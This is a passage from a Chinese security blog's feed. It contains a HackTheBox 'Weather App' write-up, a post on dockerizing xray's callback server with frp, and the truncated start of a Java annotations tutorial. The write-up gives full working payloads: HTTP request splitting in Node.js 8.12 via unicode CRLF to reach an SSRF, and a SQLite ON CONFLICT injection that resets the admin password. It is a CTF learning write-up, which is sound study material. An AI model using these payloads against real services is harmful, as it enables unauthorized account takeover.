id="2-nodejs请求走私"><a href="#2-nodejs请求走私" class="headerlink" title="2. nodejs请求走私"></a>2. nodejs请求走私</h1><p>题目给了dockerfile文件，其中的关键点就在<code>FROM node:8.12.0-alpine</code>，nodejs指定版本8.12。这个版本已经很老了，目前我使用的版本都v15.x了，所以特定指定该版本，肯定是要利用nodejs的相关漏洞。</p><p>通过搜索不难发现nodejs 8.12存在拆分攻击漏洞（请求走私）。在http get请求的时候，没有处理好unicode字符，导致可以构造回车换行符来修改http流量，可以在正常请求中夹带另一个请求。具体的漏洞原理可以查看<a href="https://xz.aliyun.com/t/2894">《通过拆分攻击实现的SSRF攻击》</a>。</p><p>而在该题目中，需要通过weather查询的api，来构造一个post到register的请求。</p><p>那么我们第一步就是要构造一个正常的注册包，题目给了源码，可以直接在本地用docker起起来。在调试的时候，为了方便可以暂时把判断<code>127.0.0.1</code>的代码给注释掉。</p><p>构造正常的注册包如下，注意<code>Content-Type</code>和<code>Content-Length</code>是两个必要的字段，参数上面仅有一行空余：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/register</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:1337</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"></span><br><span class="line">username=admixxxn2&amp;password=admin2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>构造如上数据包后，可以正常进行注册。该处有个小的tips，就是<code>Content-Type</code>如果使用<code>application/json</code>的话，会存在编码问题。nodejs的httpget函数在发起请求时，会对特殊字符采用URL编码，如果要请求走私的话，提交的json字符的<code>&#123;</code>、<code>&#125;</code>、<code>&quot;</code>都会被直接URL编码，如果夹在正常的http包中，服务端不会正常解码，会全部判断为body字符，导致json解码失败。</p><p><img src="/2021/05/23/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%8Essrf/image-20210523175455654.png" alt="image-20210523175455654"></p><p>第二步就是要通过请求走私的漏洞，构造一个原始的POST包，混合在正常的数据包中。根据漏洞原理，对于回车换行符可以采用<code>\u010D\u010A</code>，空格可以采用<code>\u0120</code>进行替换。</p><p>所以构造出来的数据包如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:1337\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012086\u010D\u010A\u010D\u010Ausername=admin&amp;password=admin2\u010D\u010A\u010D\u010AGET\u0120/123</span><br></pre></td></tr></table></figure><p>在nodejs中编写如下代码，然后nc监听即可通过nc查看构造的包</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">http.get(<span class="string">&quot;http://127.0.0.1:8888/query?param=1\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:8888\u010D\u010A\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:1337\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012086\u010D\u010A\u010D\u010Ausername=admin2&amp;password=admin2\u010D\u010A\u010D\u010AGET\u0120/123&quot;</span>)</span><br></pre></td></tr></table></figure><p>nc可得到构造好的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/app # nc -lvvp 8888</span><br><span class="line">listening on [::]:8888 ...</span><br><span class="line">connect to [::ffff:127.0.0.1]:8888 from localhost:47630 ([::ffff:127.0.0.1]:47630)</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/query?param=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/register</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:1337</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line"></span><br><span class="line">username=admin2&amp;password=admin2</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/123/data/2.5/weather?q=2,3&amp;units=metric&amp;appid=10a62430af617a949055a46fa6dec32f</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>最后一步很简单，就是将数据包放入到weather查询的api当中</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/weather</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:1337</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,ko;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9</span><br><span class="line"><span class="attribute">If-None-Match</span>: W/&quot;40a-17749845bb8&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span>: Thu, 28 Jan 2021 15:02:27 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 474</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;endpoint&quot;:&quot;127.0.0.1/query?param=1\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:80\u010D\u010A\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:80\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012090\u010D\u010A\u010D\u010Ausername=admin2&amp;password=admin2\u010D\u010A\u010D\u010AGET\u0120/123&quot;,&quot;city&quot;:&quot;2&quot;,&quot;country&quot;: &quot;3&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-sqlite注入"><a href="#3-sqlite注入" class="headerlink" title="3. sqlite注入"></a>3. sqlite注入</h1><p>上面的ssrf问题解决了，最后一个问题来了，sqlite的注入怎么利用？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="title">register</span>(<span class="params">user, pass</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> add parameterization and roll public</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="keyword">async</span> (resolve, reject) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> query = <span class="string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="subst">$&#123;user&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;pass&#125;</span>&#x27;)`</span>;</span><br><span class="line">            resolve((<span class="keyword">await</span> <span class="built_in">this</span>.db.run(query)));</span><br><span class="line">        &#125; <span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">            reject(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，注入点在insert里面，一般针对mysql的话，注入点在insert后，一般采用的是报错注入，但这道题是sqlite的后端数据库。</p><p>经过一番搜索，针对这道题可以采用<code>ON CONFLICT DO UPDATE</code>的语法，在插入时候如果有冲突的话，则将admin的密码改成我们已知的密码。</p><p>以上的注入点可以构造如下语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> (username, <span class="keyword">password</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>) <span class="keyword">ON</span> CONFLICT(username) <span class="keyword">DO</span> <span class="keyword">UPDATE</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><p>这样在注册的时候，username字段有冲突，就直接把该条记录更改为自己可控的字段。</p><p>所以根据以上的内容，可以得到以下的payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/weather</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 178.62.14.223:30863</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,ko;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9</span><br><span class="line"><span class="attribute">If-None-Match</span>: W/&quot;40a-17749845bb8&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span>: Thu, 28 Jan 2021 15:02:27 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 474</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;endpoint&quot;:&quot;127.0.0.1/query?param=1\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:80\u010D\u010A\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:80\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012090\u010D\u010A\u010D\u010Ausername=admin&amp;password=321&#x27;)+on+CONFLICT(username)+do+update+set+password=%27123%27--+\u010D\u010A\u010D\u010AGET\u0120/123&quot;,&quot;city&quot;:&quot;2&quot;,&quot;country&quot;: &quot;3&quot;&#125;</span><br></pre></td></tr></table></figure><p>最后使用admin密码321进行登录，即可得到flag。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol><li><a href="https://xz.aliyun.com/t/2894">通过拆分攻击实现的SSRF攻击</a></li><li><a href="https://www.anquanke.com/post/id/210036">浅析HTTP走私攻击</a></li><li>[题目源码，解压密码hackthebox](./Weather App.zip)</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近看到hackthebox一道题，关于nodejs请求走私的，学到不少东西，这里记录一下。&lt;/p&gt;
&lt;h1 id=&quot;1-先说题目&quot;&gt;&lt;a href=&quot;#1-先说题目&quot; class=&quot;headerlink&quot; title=&quot;1. 先说题目&quot;&gt;&lt;/a&gt;1. 先说题目&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="Pentest" scheme="http://blog.le31ei.top/categories/Pentest/"/>
    
    
    <category term="SSRF" scheme="http://blog.le31ei.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>xray反连平台docker化</title>
    <link href="http://blog.le31ei.top/2021/04/13/xray%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0docker%E5%8C%96/"/>
    <id>http://blog.le31ei.top/2021/04/13/xray%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0docker%E5%8C%96/</id>
    <published>2021-04-13T06:21:04.000Z</published>
    <updated>2021-04-13T06:21:04.213Z</updated>
    
    <content type="html"><![CDATA[<p>每次在临时使用xray进行扫描时，都没有配置比较麻烦的反连平台，有些需要外联的漏洞都没有扫到。这次想整个docker持久化的放那里，随时可以用，使用docker维护方便，部署也非常方便。本文记录下配置过程中碰到的一些知识点。</p><h1 id="0x01-xray配置项"><a href="#0x01-xray配置项" class="headerlink" title="0x01 xray配置项"></a>0x01 xray配置项</h1><p>配置反连平台主要的配置项在<code>reverse</code>项，主要有<code>http</code>、<code>dns</code>、<code>client</code>三个大项和其他一些小项目构成。</p><p>先给出总的配置项，后面挨着对各个项目进行说明。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">reverse:</span></span><br><span class="line">  <span class="attr">db_file_path:</span> <span class="string">&quot;./xray/db/reverse.db&quot;</span>                     </span><br><span class="line">  <span class="attr">token:</span> <span class="string">&quot;password&quot;</span>                                </span><br><span class="line">  <span class="attr">http:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">listen_ip:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> </span><br><span class="line">    <span class="attr">listen_port:</span> <span class="string">&quot;8080&quot;</span></span><br><span class="line">    <span class="attr">ip_header:</span> <span class="string">&quot;X-Forwarded-For&quot;</span>                       </span><br><span class="line">  <span class="attr">dns:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">listen_ip:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> </span><br><span class="line">    <span class="attr">domain:</span> <span class="string">&quot;example.com&quot;</span>                          </span><br><span class="line">    <span class="attr">is_domain_name_server:</span> <span class="literal">true</span>                 </span><br><span class="line">    <span class="attr">resolve:</span>                                     </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">A</span>                                    </span><br><span class="line">      <span class="attr">record:</span> <span class="string">ns1</span></span><br><span class="line">      <span class="attr">value:</span> <span class="number">154.</span><span class="string">x.x.x</span></span><br><span class="line">      <span class="attr">ttl:</span> <span class="number">60</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">A</span>                                    </span><br><span class="line">      <span class="attr">record:</span> <span class="string">ns2</span></span><br><span class="line">      <span class="attr">value:</span> <span class="number">154.</span><span class="string">x.x.x</span></span><br><span class="line">      <span class="attr">ttl:</span> <span class="number">60</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">remote_server:</span> <span class="literal">false</span>                          </span><br><span class="line">    <span class="attr">http_base_url:</span> <span class="string">&quot;http://recv.example.com&quot;</span>      </span><br><span class="line">    <span class="attr">dns_server_ip:</span> <span class="string">&quot;154.x.x.x&quot;</span>               </span><br></pre></td></tr></table></figure><p><strong>db_file_path</strong></p><p>xray文档解释得很清楚了，反连平台的数据库，指明一个地址就行了。</p><p><strong>token</strong></p><p>反连平台的认证密码</p><p><strong>http</strong></p><p>这个选项就是监听的端口，需要说明的是因为是docker化使用frp代理的端口，因此需要通过http头的<code>X-Forwarded-For</code>字段读取远程的ip，否则是frp的docker容器的ip地址</p><p><strong>dns</strong></p><p>该选项配置DNS的相关信息，需要制定一个域名，用于反连平台的dns解析。后面的resolve选项，制定静态的dns解析，也就是反连平台作为服务器的解析规则。</p><p><strong>client</strong></p><p>该处是配置客户端的一些参数。**<code>remote_server</code>要设置为false，当设置为true的时候，会作为客户端在启动的时候请求外联平台。**另外两个参数则是在外联平台显示的地址。</p><p><strong>dns设置</strong></p><p>在域名设置的时候，一般来说需要两个域名。一个作为主域名，来进行dnslog请求，另一个作为NS记录的解析转发域名。也可以使用DNS的胶水记录（glue record）用一个域名来转发，但需要DNS服务商的支持。</p><p>何为DNS胶水记录？</p><p>首先要了解NS记录，ns记录用于指定域名用哪个DNS服务器来解析，一般只能设置为域名的形式，如NS1.example.com。而在只有一个域名的情况下，NS需要指定域名，而DNS服务器还没有对外广播的时候，那么就陷入一个死循环，ns记录需要设置为域名，但是本域名还没有被DNS服务器所解析。举个例子，如<code>a.com</code>设置的ns记录是<code>ns.a.com</code>，我们就必须制定<code>ns.a.com</code>的A记录，否则解析<code>ns.a.com</code>又会去解析<code>a.com</code>，所以该请求就要用到DNS胶水记录了。</p><p>胶水记录本身为DNS所支持的功能。指定ns解析的域名时，可以使用本DNS的A记录。</p><h1 id="0x02-docker化"><a href="#0x02-docker化" class="headerlink" title="0x02 docker化"></a>0x02 docker化</h1><p>项目采用docker compose的形式，直接可以使用<code>docker-compose -d</code>进行一键启动。基础镜像可以直接使用alpine，需要运行go程序，所以需要在<code>Dockerfile</code>中添加如下命令才能正常运行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /lib64 &amp;&amp; ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2</span></span><br></pre></td></tr></table></figure><p>使用frp进行转发需要设置<code>depends_on</code></p><p>具体的项目结构如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">├── Dockerfile</span><br><span class="line">├── README.md</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">└── tools</span><br><span class="line">    ├── frp</span><br><span class="line">    │   ├── frpc</span><br><span class="line">    │   └── frpc.ini</span><br><span class="line">    └── xray</span><br><span class="line">        ├── config.yaml</span><br><span class="line">        ├── db</span><br><span class="line">        │   └── reverse.db</span><br><span class="line">        └── xray</span><br><span class="line"></span><br><span class="line">4 directories, 8 files</span><br></pre></td></tr></table></figure><p>Dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer=<span class="string">&quot;le31ei &lt;le31ei@qq.com&gt;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;https://mirrors.ustc.edu.cn/alpine/latest-stable/main&quot;</span> &gt; /etc/apk/repositories \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apk update \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apk add openssl musl-dev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /lib64 &amp;&amp; ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /tools</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">xray:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">volumes:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">./tools:/tools</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">./xray/xray</span> <span class="string">--config</span> <span class="string">./xray/config.yaml</span> <span class="string">reverse</span> </span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">frp:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">volumes:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">./tools:/tools</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">./frp/frpc</span> <span class="string">-c</span> <span class="string">./frp/frpc.ini</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">xray</span></span><br></pre></td></tr></table></figure><h1 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h1><p>反连平台的http模块支持从http协议的header中取真实ip，但dns模块没有类似的功能，所以在用docker封装的反连平台中，<code>RemoteAddr</code>均为docker中frp容器的地址，目前暂未想到解决办法，将就使用了。</p><p><img src="/2021/04/13/xray%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0docker%E5%8C%96/image-20210413141854001.png" alt="image-20210413141854001"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;每次在临时使用xray进行扫描时，都没有配置比较麻烦的反连平台，有些需要外联的漏洞都没有扫到。这次想整个docker持久化的放那里，随时可以用，使用docker维护方便，部署也非常方便。本文记录下配置过程中碰到的一些知识点。&lt;/p&gt;
&lt;h1 id=&quot;0x01-xray配置项</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="docker" scheme="http://blog.le31ei.top/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>java安全学习之注解</title>
    <link href="http://blog.le31ei.top/2021/03/30/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%A8%E8%A7%A3/"/>
    <id>http://blog.le31ei.top/2021/03/30/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%A8%E8%A7%A3/</id>
    <published>2021-03-30T08:34:14.000Z</published>
    <updated>2021-03-30T08:34:14.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-什么是注解"><a href="#0x01-什么是注解" class="headerlink" title="0x01 什么是注解"></a>0x01 什么是注解</h1><p>注解是在java中类、方法、参数前面的一种特殊的注释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itranswarp.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Demo1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;after construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Demo1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is demo1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo1 d = <span class="keyword">new</span> Demo1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注解共分为三类：</p><ol><li>编译器使用的注释，如<code>@Override</code>，检查该方法是否正确的实现了覆写</li><li>由工具处理<code>.class</code>文件中使用的注解，一般在底层库使用</li><li>程序运行中能够读取的注解，类似于自定义的注解，加载后存在于jvm中</li></ol><h1 id="0x02-定义注解"><a href="#0x02-定义注解" class="headerlink" title="0x02 定义注解"></a>0x02 定义注解</h1><p>在java中使用<code>@interface</code>语法来定义注解，例如<code>Override</code>的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.SOURCE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Override &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Override注解不带任何配置参数。<code>@Target</code>和<code>Retention</code>表示的是元注解，能够修饰自定义注解的注解</p><h2 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h2><p><strong>@Target</strong></p><p>表示定义的注解能够被用到哪些位置：</p><ol><li>类或者接口：<code>ElementType.TYPE</code></li><li>字段：<code>ElementType.FIELD</code></li><li>方法：<code>ElementType.METHOD</code></li><li>构造方法：<code>ElementType.CONSTRUCTOR</code></li><li>方法参数：<code>ElementType.PARAMETER</code></li></ol><p>可以定义一个注解同时用于方法或者字段上面，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span 